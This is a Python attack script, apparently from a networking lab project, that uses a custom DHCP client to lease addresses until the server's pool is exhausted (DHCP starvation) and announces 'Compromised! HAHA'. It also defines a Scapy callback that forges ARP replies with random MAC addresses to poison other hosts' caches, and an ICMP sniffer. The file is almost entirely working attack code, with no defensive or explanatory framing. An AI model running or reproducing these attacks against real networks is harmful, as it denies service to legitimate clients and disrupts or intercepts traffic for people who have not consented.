import sys
import os.path
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), os.path.pardir)))
import os
import random
from client import Client
from scapy.all import *
import threading

ip_table = {}
malcious_client = Client()


def arp_monitor_callback(pkt):
    asking_ip = pkt.pdst
    server_ip = pkt.psrc
    if ARP in pkt and pkt[ARP].op == 1: #who-has
        malicious_pkt = ARP(op=2, pdst = server_ip, hwsrc = rand_mac(), psrc = asking_ip)
        send(malicious_pkt, verbose = False)

def icmp_monitor_callback(pkt):
    print(pkt[Ether].dst)
    malcious_icmp = 0
    return pkt.show()


def rand_mac():
    return "%02x:%02x:%02x:%02x:%02x:%02x" % (
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255)
        )

def ipToString(ip):
    return "%d.%d.%d.%d" % (ip[0], ip[1], ip[2], ip[3])

def assignIpCommand(ip):
    cmd = "ip addr add " + ipToString(ip) + "/24 dev enp0s8"
    return cmd

def leaseUntilEmpty():
    while True:
        malcious_client.sendDiscover()
        malcious_client.awaitMessage()
        malcious_client.sendRequest()
        malcious_client.awaitMessage()
        obtained_ip = malcious_client.response.byteArrayToList(malcious_client.response.YIADDR)
        if malcious_client.response._DHCPOptions_dict[53] == 4:
            print("Compromised! HAHA")
            break
        print("Obtained: ", obtained_ip)
        command = assignIpCommand(obtained_ip)
        os.system(command)

def arp_sniff():
    sniff(iface="enp0s8", prn=arp_monitor_callback, filter="arp", store=0)

def icmp_sniff():
    sniff(iface="enp0s8", prn=icmp_monitor_callback, filter="icmp", store=0)

# thread1 = threading.Thread(target = leaseUntilEmpty)
# thread1.start()
# thread2 = threading.Thread(target = arp_sniff)
# thread2.start()
# icmp_sniff()
leaseUntilEmpty()

